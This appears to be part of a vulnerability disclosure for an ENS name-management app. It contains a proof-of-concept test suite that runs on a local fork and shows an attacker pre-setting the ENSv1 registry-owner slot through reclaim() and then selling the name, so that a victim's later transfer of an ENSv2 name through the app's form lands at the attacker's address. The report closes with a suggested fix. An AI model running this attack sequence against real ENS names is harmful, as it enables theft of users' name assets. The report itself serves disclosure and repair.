    const setAddr = await sendFrom(
      VICTIM,
      live,
      encodeFunctionData({
        abi: parseAbi([
          'function setAddr(bytes32 node, uint256 coinType, bytes a)',
        ]),
        functionName: 'setAddr',
        args: [namehash(`${label}.eth`), 60n, VICTIM],
      }),
      '0x100000',
    )
    expect(setAddr.status).toBe('success')
    console.log(
      '[F3 v2 opening]',
      jsonBig({
        label: `${label}.eth`,
        tokenId: ids[label],
        latestOwner: (await getState(ids[label])).latestOwner,
        balVictim: await balanceOf(VICTIM, ids[label]),
        balAttacker: await balanceOf(ATTACKER, ids[label]),
      }),
    )
  }

  const wagmi = await import('@/lib/wagmi')
  const { createClient } = await import('viem')
  ensClient = createClient({
    chain: wagmi.sepoliaWithEns,
    transport: http(FORK),
  })
  ;({ routeTree } = await import('@/routeTree.gen'))
  ;({ queryClient: appQueryClient } = await import('@/utils/queryClient'))
  ;({ getResolvedAddress } = await import(
    '@/features/address/queries/getResolvedAddress'
  ))
  ;({ universalResolverAddress } = await import(
    '@/lib/constants/universalResolver'
  ))
  console.log(
    '[F4] mock wallet connected account (VITE_MOCK_ACCOUNT) =',
    process.env.VITE_MOCK_ACCOUNT,
  )
}, 1_200_000)

afterAll(() => {
  console.log('[GUARD] allowedRequests =', allowedRequests)
  console.log(
    '[GUARD] refusedHosts =',
    JSON.stringify([...new Set(refusedHosts)]),
  )
})

const openTransferRoute = async (name: string, tag: string) => {
  appQueryClient.clear()
  const router = createRouter({
    routeTree,
    history: createMemoryHistory({
      initialEntries: [`/${encodeURIComponent(name)}/ownership/transfer`],
    }),
    context: {},
    defaultPreload: false,
  })
  const view = render(<RouterProvider router={router as never} />)
  const user = userEvent.setup({ document: view.baseElement.ownerDocument })

  await waitFor(
    () => {
      const text = view.baseElement.textContent ?? ''
      if (!text.includes('Transfer ownership')) {
        throw new Error(
          `transfer route not rendered yet: ${text.slice(0, 160)}`,
        )
      }
      const settled =
        text.includes('Recipient') ||
        text.includes('Not authorized') ||
        text.includes('Transfer not available') ||
        text.includes('Connect your wallet') ||
        text.includes('Couldn’t check transfer permission')
      if (!settled) throw new Error('route still loading')
    },
    { timeout: 240_000, interval: 250 },
  )

  const text = view.baseElement.textContent ?? ''
  const outcome = {
    pathname: router.state.location.pathname,
    formRendered: text.includes('Recipient'),
    // SendNameForm.tsx:110-117, the warning Alert five lines above the
    // Recipient label. Read from the rendered page, not from source.
    irreversibilityWarningRendered: text.includes(
      'Transferring ownership of an ENS name is irreversible. Make sure you check the recipient address before proceeding.',
    ),
    ownerGateRefused: text.includes('You are not the owner of this name.'),
    roleGateRefused: text.includes('This wallet can’t transfer this name.'),
    walletNotConnected: text.includes('Connect your wallet'),
  }
  console.log(`[${tag} route]`, jsonBig(outcome))
  return { router, view, user, outcome }
}

const typeRecipient = async (
  view: ReturnType<typeof render>,
  user: ReturnType<typeof userEvent.setup>,
  typed: string,
  tag: string,
) => {
  const input = await waitFor(
    () => {
      const el = view.baseElement.querySelector(
        'input[placeholder="ENS name or address"]',
      ) as HTMLInputElement | null
      if (!el) throw new Error('recipient input not rendered')
      return el
    },
    { timeout: 120_000, interval: 250 },
  )
  await user.click(input)
  await user.paste(typed)

  // Everything read below comes from the field's own container, which is the
  // `Recipient` block of `SendNameForm.tsx:119-133`: the label, the input and
  // whichever status line `AddressNameInput` renders for the current state.
  const field = () => input.parentElement as HTMLElement
  const settledOn = [
    'Could not resolve an address',
    'Enter a valid ENS name or address',
    'Something went wrong resolving',
    'The recipient already owns this name.',
    'Can’t transfer to the zero address.',
  ]
  await waitFor(
    () => {
      const t = field().textContent ?? ''
      const done =
        settledOn.some((s) => t.includes(s)) || /0x[0-9a-fA-F]{40}/.test(t)
      if (!done || t.includes('Resolving address')) {
        throw new Error(`recipient field not settled: ${t.slice(0, 120)}`)
      }
    },
    { timeout: 120_000, interval: 250 },
  )

  const t = field().textContent ?? ''
  const shown = [...new Set(t.match(/0x[0-9a-fA-F]{40}/g) ?? [])]
  const rendered = {
    typed,
    fieldText: t.slice(0, 200),
    fullAddressesRendered: shown,
    rendersAttacker: shown.some(
      (a) => a.toLowerCase() === ATTACKER.toLowerCase(),
    ),
    rendersSelected: shown.some(
      (a) => a.toLowerCase() === ATTACKER_ALT.toLowerCase(),
    ),
    rendersVictim: shown.some((a) => a.toLowerCase() === VICTIM.toLowerCase()),
    rendersVictimRecipient: shown.some(
      (a) => a.toLowerCase() === VICTIM_RECIPIENT.toLowerCase(),
    ),
    couldNotResolveLines: (t.match(/Could not resolve an address/g) ?? [])
      .length,
    selfRefusal: t.includes('The recipient already owns this name.'),
    zeroRefusal: t.includes('Can’t transfer to the zero address.'),
    transferButtonEnabled: Array.from(
      view.baseElement.querySelectorAll('button'),
    ).some(
      (b) =>
        (b.textContent ?? '').includes('Transfer name') &&
        !(b as HTMLButtonElement).disabled,
    ),
  }
  console.log(`[${tag} field]`, jsonBig(rendered))
  return rendered
}

const isDialogActionButton = (button: Element) =>
  !(button as HTMLButtonElement).disabled &&
  /^(Start|Next|Done|Retry|Confirm|Open wallet|Try again)$/i.test(
    (button.textContent ?? '').trim(),
  )

const driveTransfer = async (
  view: ReturnType<typeof render>,
  user: ReturnType<typeof userEvent.setup>,
  tag: string,
  movedId: bigint,
  expectRecipient: Address,
  // biome-ignore lint/complexity/noExcessiveCognitiveComplexity: one loop drives every shipped modal state.
) => {
  const startButton = await waitFor(
    () => {
      const b = Array.from(view.baseElement.querySelectorAll('button')).find(
        (el) =>
          (el.textContent ?? '').includes('Transfer name') &&
          !(el as HTMLButtonElement).disabled,
      )
      if (!b) throw new Error('Transfer name button not enabled yet')
      return b as HTMLElement
    },
    { timeout: 180_000, interval: 250 },
  )
  // hazard 17: viem caches getBlockNumber, and a cached head can sit BELOW this
  // arm's own transactions, silently emptying the log window.
  const armStartBlock = await pub.getBlockNumber({ cacheTime: 0 })
  await user.click(startButton)

  const dialog = () =>
    view.baseElement.querySelector('[role="dialog"]') as HTMLElement | null

  const stepLabelsSeen = new Set<string>()
  let iterations = 0
  while (iterations < 80) {
    iterations += 1
    if ((await balanceOf(expectRecipient, movedId)) === 1n) break
    const d = dialog()
    if (d) {
      const txt = (d.textContent ?? '').trim()
      for (const label of [
        'Update ETH address',
        'Detach resolver',
        'Detach registry',
        'Transfer name',
      ]) {
        if (txt.includes(label)) stepLabelsSeen.add(label)
      }
      const candidates = Array.from(d.querySelectorAll('button')).filter(
        isDialogActionButton,
      )
      if (candidates.length > 0) {
        await user.click(candidates[candidates.length - 1] as HTMLElement)
      }
    }
    await new Promise((r) => setTimeout(r, 1500))
  }

  const head = await pub.getBlockNumber({ cacheTime: 0 })
  const logs = await pub.getLogs({
    address: V2_ETH_REGISTRY,
    event: {
      type: 'event',
      name: 'TransferSingle',
      inputs: [
        { indexed: true, name: 'operator', type: 'address' },
        { indexed: true, name: 'from', type: 'address' },
        { indexed: true, name: 'to', type: 'address' },
        { indexed: false, name: 'id', type: 'uint256' },
        { indexed: false, name: 'value', type: 'uint256' },
      ],
    },
    fromBlock: armStartBlock + 1n,
    toBlock: head,
  })
  const moves = logs.map((l) => ({
    txHash: l.transactionHash,
    from: (l.args as { from?: Address }).from,
    to: (l.args as { to?: Address }).to,
    id: (l.args as { id?: bigint }).id,
  }))
  console.log(
    `[${tag} flow]`,
    jsonBig({ iterations, stepLabelsSeen: [...stepLabelsSeen] }),
  )
  console.log(
    `[${tag} TransferSingle]`,
    jsonBig({ fromBlock: armStartBlock + 1n, toBlock: head, moves }),
  )
  return { stepLabelsSeen: [...stepLabelsSeen], moves, armStartBlock, head }
}

const movesOfTokenSince = async (startBlock: bigint, id: bigint) => {
  const head = await pub.getBlockNumber({ cacheTime: 0 })
  const logs = await pub.getLogs({
    address: V2_ETH_REGISTRY,
    event: {
      type: 'event',
      name: 'TransferSingle',
      inputs: [
        { indexed: true, name: 'operator', type: 'address' },
        { indexed: true, name: 'from', type: 'address' },
        { indexed: true, name: 'to', type: 'address' },
        { indexed: false, name: 'id', type: 'uint256' },
        { indexed: false, name: 'value', type: 'uint256' },
      ],
    },
    fromBlock: startBlock,
    toBlock: head,
  })
  return {
    window: `${startBlock}..${head}`,
    transferSingleLogsInWindow: logs.length,
    movesOfThisToken: logs.filter((l) => (l.args as { id?: bigint }).id === id)
      .length,
  }
}

describe('an address the attacker chose with reclaim() receives the name the victim sent', () => {
  it('1. SELECTION: the new ERC-721 holder clears the resolver, writes a chosen address into the ENSv1 registry-owner slot, and reads the same address from the app', async () => {
    const before = await v1State(V1_NAME, V1_LABEL)
    const urBefore = await urAddrFor(V1_NAME)
    const appBefore = await appAnswerFor(V1_NAME)
    console.log(
      `[1 SELECT] before: registrant=${before.registrant} registryOwner=${before.registryOwner} v1Resolver=${before.resolver}`,
    )
    console.log(
      `[1 SELECT] before: universalResolver addr(60) = ${String(urBefore)} app getResolvedAddress = ${appBefore}`,
    )

    // Write 0, sent by ATTACKER, who holds the ERC-721. It first puts the
    // registry-owner slot under ATTACKER's authority.
    const reclaimSelf = await sendSigned(
      ATTACKER_ACCOUNT,
      V1_BASE_REGISTRAR,
      encodeFunctionData({
        abi: registrarAbi,
        functionName: 'reclaim',
        args: [labelhashOf(V1_LABEL), ATTACKER],
      }),
    )
    const afterReclaimSelf = await v1State(V1_NAME, V1_LABEL)
    console.log(
      `[1 SELECT] write 0: BaseRegistrar.reclaim(labelhash, ${ATTACKER}) sent by ${ATTACKER} status=${reclaimSelf.status}; registryOwner read back = ${afterReclaimSelf.registryOwner} (registrant still ${afterReclaimSelf.registrant})`,
    )
    expect(reclaimSelf.status).toBe('success')
    expect(afterReclaimSelf.registryOwner).toBe(ATTACKER)
    expect(afterReclaimSelf.registrant).toBe(ATTACKER)

    // Write 1, sent by ATTACKER, who now holds the ENSv1 registry-owner slot.
    const clear = await sendSigned(
      ATTACKER_ACCOUNT,
      V1_REGISTRY,
      encodeFunctionData({
        abi: registryAbi,
        functionName: 'setResolver',
        args: [namehash(V1_NAME), zeroAddress],
      }),
    )
    const mid = await v1State(V1_NAME, V1_LABEL)
    const urMid = await urAddrFor(V1_NAME)
    const appMid = await appAnswerFor(V1_NAME)
    console.log(
      `[1 SELECT] write 1: ENS.setResolver(node, 0x0) sent by ${ATTACKER} status=${clear.status} tx=${clear.hash}`,
    )
    console.log(
      `[1 SELECT] after write 1: registryOwner=${mid.registryOwner} v1Resolver=${mid.resolver} universalResolver addr(60) = ${String(urMid)} app getResolvedAddress = ${appMid}`,
    )
    expect(clear.status).toBe('success')
    expect(mid.registryOwner).toBe(ATTACKER)
    expect(mid.resolver).toBe(zeroAddress)
    expect(urMid).toBeNull()
    expect(appMid.toLowerCase()).toBe(ATTACKER.toLowerCase())

    // Write 2 chooses the terminal destination. BaseRegistrar.reclaim takes
    // the registry-owner destination as a free argument. The registrar holder
    // sends it, but the selected address is a distinct attacker-controlled
    // address that is neither the registrant nor the previous slot holder.
    const select = await sendSigned(
      ATTACKER_ACCOUNT,
      V1_BASE_REGISTRAR,
      encodeFunctionData({
        abi: registrarAbi,
        functionName: 'reclaim',
        args: [labelhashOf(V1_LABEL), ATTACKER_ALT],
      }),
    )
    const after = await v1State(V1_NAME, V1_LABEL)
    const urAfter = await urAddrFor(V1_NAME)
    const appAfter = await appAnswerFor(V1_NAME)
    console.log(
      `[1 SELECT] write 2: BaseRegistrar.reclaim(labelhash, ${ATTACKER_ALT}) sent by ${ATTACKER} status=${select.status} tx=${select.hash}`,
    )
    console.log(
      `[1 SELECT] after write 2: registrant=${after.registrant} registryOwner=${after.registryOwner} v1Resolver=${after.resolver}`,
    )
    console.log(
      `[1 SELECT] after write 2: universalResolver addr(60) = ${String(urAfter)} app getResolvedAddress = ${appAfter}`,
    )
    expect(select.status).toBe('success')
    expect(after.registryOwner).toBe(ATTACKER_ALT)
    expect(after.resolver).toBe(zeroAddress)
    expect(urAfter).toBeNull()
    // The app now answers the distinct address ATTACKER passed to reclaim, and
    // the ERC-721 has not moved to anybody else yet.
    expect(appAfter.toLowerCase()).toBe(ATTACKER_ALT.toLowerCase())
    expect(after.registrant).toBe(ATTACKER)
  }, 600_000)

  it('2. SALE: ATTACKER sells the ERC-721 to the victim recipient account, the two ENSv1 owner slots split, and the app still answers the selected address', async () => {
    const before = await appAnswerFor(V1_NAME)
    const sale = await sendSigned(
      ATTACKER_ACCOUNT,
      V1_BASE_REGISTRAR,
      encodeFunctionData({
        abi: registrarAbi,
        functionName: 'transferFrom',
        args: [ATTACKER, VICTIM_RECIPIENT, labelhashOf(V1_LABEL)],
      }),
    )
    const state = await v1State(V1_NAME, V1_LABEL)
    const ensjsOwnership = await getOwnerV1(pub as never, { name: V1_NAME })
    const after = await appAnswerFor(V1_NAME)
    console.log(
      `[2 SALE] transferFrom(${ATTACKER} -> ${VICTIM_RECIPIENT}) sent by ${ATTACKER} status=${sale.status} tx=${sale.hash}`,
    )
    console.log(
      `[2 SALE] registrant now=${state.registrant} v1RegistryOwner still=${state.registryOwner}`,
    )
    console.log(`[2 SALE] ensjs getOwner v1 = ${jsonBig(ensjsOwnership)}`)
    console.log(
      `[2 SALE] app getResolvedAddress before=${before} after=${after}`,
    )
    expect(sale.status).toBe('success')
    // The buyer holds the asset. The buyer did NOT call reclaim, which is a
    // separate transaction the transfer does not perform.
    expect(state.registrant).toBe(VICTIM_RECIPIENT)
    expect(state.registryOwner).toBe(ATTACKER_ALT)
    expect(ensjsOwnership?.registrant).toBe(VICTIM_RECIPIENT)
    expect(ensjsOwnership?.owner).toBe(ATTACKER_ALT)
    expect(before.toLowerCase()).toBe(ATTACKER_ALT.toLowerCase())
    expect(after.toLowerCase()).toBe(ATTACKER_ALT.toLowerCase())
  }, 600_000)

  it('3. RETAINED AUTHORITY: after the sale the selected attacker-controlled address can still write ENSv1 state for the name', async () => {
    const setRes = await sendSigned(
      ATTACKER_ALT_ACCOUNT,
      V1_REGISTRY,
      encodeFunctionData({
        abi: registryAbi,
        functionName: 'setResolver',
        args: [namehash(V1_NAME), V1_BASE_REGISTRAR],
      }),
    )
    const mid = await v1State(V1_NAME, V1_LABEL)
    const clearRes = await sendSigned(
      ATTACKER_ALT_ACCOUNT,
      V1_REGISTRY,
      encodeFunctionData({
        abi: registryAbi,
        functionName: 'setResolver',
        args: [namehash(V1_NAME), zeroAddress],
      }),
    )
    const end = await v1State(V1_NAME, V1_LABEL)
    const app = await appAnswerFor(V1_NAME)
    console.log(
      `[3 AUTH] SELECTED ENS.setResolver(non-zero) status=${setRes.status}; resolver read back = ${mid.resolver}`,
    )
    console.log(
      `[3 AUTH] SELECTED ENS.setResolver(0x0) status=${clearRes.status}; resolver read back = ${end.resolver}`,
    )
    console.log(
      `[3 AUTH] registrant unchanged = ${end.registrant}; app getResolvedAddress = ${app}`,
    )
    expect(setRes.status).toBe('success')
    expect(mid.resolver).toBe(V1_BASE_REGISTRAR)
    expect(clearRes.status).toBe('success')
    expect(end.resolver).toBe(zeroAddress)
    expect(end.registrant).toBe(VICTIM_RECIPIENT)
    expect(app.toLowerCase()).toBe(ATTACKER_ALT.toLowerCase())
  }, 600_000)

  it('4. SUBJECT: VICTIM transfers an ENSv2 name to the ENSv1 name held by their recipient account, and the attacker-selected address receives it', async () => {
    const id = ids[V2_SUBJECT_A]
    const v1 = await v1State(V1_NAME, V1_LABEL)
    const before = {
      latestOwner: (await getState(id)).latestOwner,
      balVictim: await balanceOf(VICTIM, id),
      balAttacker: await balanceOf(ATTACKER, id),
      balSelected: await balanceOf(ATTACKER_ALT, id),
      typedNameRegistrant: v1.registrant,
      typedNameRegistryOwner: v1.registryOwner,
    }
    console.log(
      '[4 before]',
      jsonBig({ name: `${V2_SUBJECT_A}.eth`, typed: V1_NAME, ...before }),
    )
    expect(before.balVictim).toBe(1n)
    expect(before.balAttacker).toBe(0n)
    // The user controls the account that holds the typed name, but that account
    // differs from the one currently sending the ENSv2 name.
    expect(before.typedNameRegistrant).toBe(VICTIM_RECIPIENT)

    const { view, user, outcome } = await openTransferRoute(
      `${V2_SUBJECT_A}.eth`,
      '4A',
    )
    expect(outcome.walletNotConnected).toBe(false)
    expect(outcome.ownerGateRefused).toBe(false)
    expect(outcome.roleGateRefused).toBe(false)
    expect(outcome.formRendered).toBe(true)
    // The application's own irreversibility warning is on the page the victim
    // is looking at. The address rendered below is the one ATTACKER selected.
    expect(outcome.irreversibilityWarningRendered).toBe(true)

    const field = await typeRecipient(view, user, V1_NAME, '4B')
    expect(field.rendersSelected).toBe(true)
    expect(field.rendersAttacker).toBe(false)
    expect(field.rendersVictim).toBe(false)
    expect(field.rendersVictimRecipient).toBe(false)
    expect(field.couldNotResolveLines).toBe(0)
    expect(field.selfRefusal).toBe(false)
    expect(field.transferButtonEnabled).toBe(true)

    // No switch is touched. This is the form's own default configuration.
    const run = await driveTransfer(view, user, '4C', id, ATTACKER_ALT)

    const after = {
      latestOwner: (await getState(id)).latestOwner,
      balVictim: await balanceOf(VICTIM, id),
      balAttacker: await balanceOf(ATTACKER, id),
      balSelected: await balanceOf(ATTACKER_ALT, id),
    }
    console.log(
      '[4 TERMINAL]',
      jsonBig({ name: `${V2_SUBJECT_A}.eth`, ...after }),
    )

    // The asset moved, and it moved to the address ATTACKER selected.
    expect(after.balSelected).toBe(1n)
    expect(after.balAttacker).toBe(0n)
    expect(after.balVictim).toBe(0n)
    expect(after.latestOwner.toLowerCase()).toBe(ATTACKER_ALT.toLowerCase())
    expect(run.moves.length).toBe(1)
    expect(run.moves[0].id).toBe(id)
    expect(run.moves[0].from?.toLowerCase()).toBe(VICTIM.toLowerCase())
    expect(run.moves[0].to?.toLowerCase()).toBe(ATTACKER_ALT.toLowerCase())

    // Recovery: the registry re-keys the name's roles to the new holder, so the
    // sender has no in-product route back. Measured, not argued.
    const victimRole = await ensjsHasRoles(ensClient, {
      registryAddress: V2_ETH_REGISTRY,
      label: V2_SUBJECT_A,
      roles: ['ROLE_CAN_TRANSFER_ADMIN'],
      account: VICTIM,
    } as never)
    const selectedRole = await ensjsHasRoles(ensClient, {
      registryAddress: V2_ETH_REGISTRY,
      label: V2_SUBJECT_A,
      roles: ['ROLE_CAN_TRANSFER_ADMIN'],
      account: ATTACKER_ALT,
    } as never)
    const clawback = await sendFrom(
      VICTIM,
      V2_ETH_REGISTRY,
      encodeFunctionData({
        abi: erc1155Abi,
        functionName: 'safeTransferFrom',
        args: [ATTACKER_ALT, VICTIM, id, 1n, '0x'],
      }),
      '0x7A120',
    )
    console.log(
      '[4 RECOVERY]',
      jsonBig({
        'hasRoles(ROLE_CAN_TRANSFER_ADMIN, VICTIM)': victimRole,
        'hasRoles(ROLE_CAN_TRANSFER_ADMIN, SELECTED)': selectedRole,
        'VICTIM safeTransferFrom(SELECTED -> VICTIM) status': clawback.status,
        rpcMessage: clawback.rpcMessage,
        revertData: clawback.revertData,
        balVictimAfterClawbackAttempt: String(await balanceOf(VICTIM, id)),
        balAttackerAfterClawbackAttempt: String(await balanceOf(ATTACKER, id)),
        balSelectedAfterClawbackAttempt: String(
          await balanceOf(ATTACKER_ALT, id),
        ),
      }),
    )
    expect(victimRole).toBe(false)
    expect(selectedRole).toBe(true)
    expect(clawback.status).toBe('reverted')
    expect(await balanceOf(ATTACKER_ALT, id)).toBe(1n)
    view.unmount()
  }, 1_800_000)

  it('5. CONTROL: the victim recipient account calls reclaim, one condition changes, and the same form sends the control name to that intended account', async () => {
    const id = ids[V2_CONTROL]
    const appBefore = await appAnswerFor(V1_NAME)
    const reclaim = await sendSigned(
      VICTIM_RECIPIENT_ACCOUNT,
      V1_BASE_REGISTRAR,
      encodeFunctionData({
        abi: registrarAbi,
        functionName: 'reclaim',
        args: [labelhashOf(V1_LABEL), VICTIM_RECIPIENT],
      }),
    )
    const state = await v1State(V1_NAME, V1_LABEL)
    const appAfter = await appAnswerFor(V1_NAME)
    // The authority moved rather than the app changing its mind.
    const selectedWrite = await sendFrom(
      ATTACKER_ALT,
      V1_REGISTRY,
      encodeFunctionData({
        abi: registryAbi,
        functionName: 'setResolver',
        args: [namehash(V1_NAME), V1_BASE_REGISTRAR],
      }),
      '0x30D40',
    )
    // And the selection primitive itself is gated on holding the ERC-721:
    // ATTACKER, who sold it, cannot take the slot back.
    const attackerReclaim = await sendFrom(
      ATTACKER,
      V1_BASE_REGISTRAR,
      encodeFunctionData({
        abi: registrarAbi,
        functionName: 'reclaim',
        args: [labelhashOf(V1_LABEL), ATTACKER],
      }),
      '0x30D40',
    )
    console.log(
      `[5 CONTROL] ATTACKER BaseRegistrar.reclaim on the same name after the sale status=${attackerReclaim.status}; registryOwner still = ${(await v1State(V1_NAME, V1_LABEL)).registryOwner}`,
    )
    expect(attackerReclaim.status).toBe('reverted')
    console.log(
      `[5 CONTROL] executed endpoint: BaseRegistrar(${V1_BASE_REGISTRAR}).reclaim(labelhash, ${VICTIM_RECIPIENT}) from ${VICTIM_RECIPIENT} status=${reclaim.status} tx=${reclaim.hash}`,
    )
    console.log(
      `[5 CONTROL] v1RegistryOwner before=${ATTACKER_ALT} after=${state.registryOwner}; registrant unchanged=${state.registrant}; resolver still=${state.resolver}`,
    )
    console.log(
      `[5 CONTROL] app getResolvedAddress before=${appBefore} after=${appAfter}`,
    )
    console.log(
      `[5 CONTROL] SELECTED ENS.setResolver on the same name after reclaim status=${selectedWrite.status} rpcMessage=${selectedWrite.rpcMessage} revertData=${selectedWrite.revertData}`,
    )
    expect(reclaim.status).toBe('success')
    expect(state.registryOwner).toBe(VICTIM_RECIPIENT)
    expect(state.registrant).toBe(VICTIM_RECIPIENT)
    expect(state.resolver).toBe(zeroAddress)
    expect(appBefore.toLowerCase()).toBe(ATTACKER_ALT.toLowerCase())
    expect(appAfter.toLowerCase()).toBe(VICTIM_RECIPIENT.toLowerCase())
    expect(selectedWrite.status).toBe('reverted')

    const { view, user, outcome } = await openTransferRoute(
      `${V2_CONTROL}.eth`,
      '5A',
    )
    expect(outcome.formRendered).toBe(true)
    const field = await typeRecipient(view, user, V1_NAME, '5B')
    // With the slot corrected, the same typed name produces the intended
    // recipient account and the shipped flow transfers the control token there.
    expect(field.selfRefusal).toBe(false)
    expect(field.rendersSelected).toBe(false)
    expect(field.rendersAttacker).toBe(false)
    expect(field.rendersVictim).toBe(false)
    expect(field.rendersVictimRecipient).toBe(true)
    expect(field.transferButtonEnabled).toBe(true)

    const run = await driveTransfer(view, user, '5C', id, VICTIM_RECIPIENT)
    const after = {
      name: `${V2_CONTROL}.eth`,
      latestOwner: (await getState(id)).latestOwner,
      balVictim: await balanceOf(VICTIM, id),
      balVictimRecipient: await balanceOf(VICTIM_RECIPIENT, id),
      balAttacker: await balanceOf(ATTACKER, id),
    }
    console.log('[5 TERMINAL]', jsonBig(after))
    expect(after.balVictim).toBe(0n)
    expect(after.balVictimRecipient).toBe(1n)
    expect(after.balAttacker).toBe(0n)
    expect(after.latestOwner.toLowerCase()).toBe(VICTIM_RECIPIENT.toLowerCase())
    expect(run.moves.length).toBe(1)
    expect(run.moves[0].id).toBe(id)
    expect(run.moves[0].from?.toLowerCase()).toBe(VICTIM.toLowerCase())
    expect(run.moves[0].to?.toLowerCase()).toBe(VICTIM_RECIPIENT.toLowerCase())
    view.unmount()
  }, 1_800_000)

  it('6. THE APP’S OWN REFUSAL: when the resolution chain returns nothing, the field refuses and the Transfer button never enables', async () => {
    const id = ids[V2_REFUSAL]
    const absentState = await pub.readContract({
      address: V1_REGISTRY,
      abi: registryAbi,
      functionName: 'owner',
      args: [namehash(ABSENT)],
    })
    const app = await appAnswerFor(ABSENT)
    console.log(
      `[6 REFUSE] ${ABSENT} v1RegistryOwner=${absentState} app getResolvedAddress = ${app}`,
    )
    expect(absentState).toBe(zeroAddress)
    expect(app).toBe('null')

    const startBlock = await pub.getBlockNumber({ cacheTime: 0 })
    const { view, user, outcome } = await openTransferRoute(
      `${V2_REFUSAL}.eth`,
      '6A',
    )
    expect(outcome.formRendered).toBe(true)
    const field = await typeRecipient(view, user, ABSENT, '6B')
    expect(field.couldNotResolveLines).toBeGreaterThan(0)
    expect(field.transferButtonEnabled).toBe(false)

    // The window can share its opening block with the previous arm's last
    // transaction, so the count that matters is of moves of THIS arm's token.
    const window = await movesOfTokenSince(startBlock, id)
    const after = {
      name: `${V2_REFUSAL}.eth`,
      latestOwner: (await getState(id)).latestOwner,
      balVictim: await balanceOf(VICTIM, id),
      balAttacker: await balanceOf(ATTACKER, id),
      ...window,
    }
    console.log('[6 TERMINAL]', jsonBig(after))
    expect(after.balVictim).toBe(1n)
    expect(after.balAttacker).toBe(0n)
    expect(after.latestOwner.toLowerCase()).toBe(VICTIM.toLowerCase())
    expect(window.movesOfThisToken).toBe(0)
    view.unmount()
  }, 1_800_000)

  it('7. the local-only guard held for the whole run', () => {
    console.log('[7 GUARD] allowedRequests =', allowedRequests)
    console.log(
      '[7 GUARD] refusedHosts =',
      JSON.stringify([...new Set(refusedHosts)]),
    )
    expect(allowedRequests).toBeGreaterThan(0)
    for (const h of new Set(refusedHosts)) {
      expect(h).not.toBe(ALLOWED_HOST)
    }
  })
})
```

## Suggested fix

When getEnsAddress returns null, do not convert an ENS registry controller into a resolved address.

The narrow repair is to delete the owner fallback in apps/portal/src/features/roles/helpers/addUser.handlers.ts and return null. useAddressResolution already maps null to unresolved, AddressNameInput already displays Could not resolve an address, and SendNameForm already disables the transfer.

If the product retains an owner convenience fallback, resolveEnsOwner must preserve both ENSv1 fields and use registrant for an unwrapped second-level name. The UI should label any owner substitution as such rather than presenting it as ENS resolution.

Both safe terminals are measured:

| Behavior        | Current code           | Return null       | Prefer registrant      |
| --------------- | ---------------------- | ----------------- | ---------------------- |
| Field           | Displays 0xB3fa...3896 | Could not resolve | Displays 0x57d6...A470 |
| Transfer button | Enabled                | Disabled          | Enabled                |
| Token move      | To 0xB3fa...3896       | None              | To 0x57d6...A470       |
| Terminal owner  | 0xB3fa...3896          | Connected sender  | Intended recipient     |
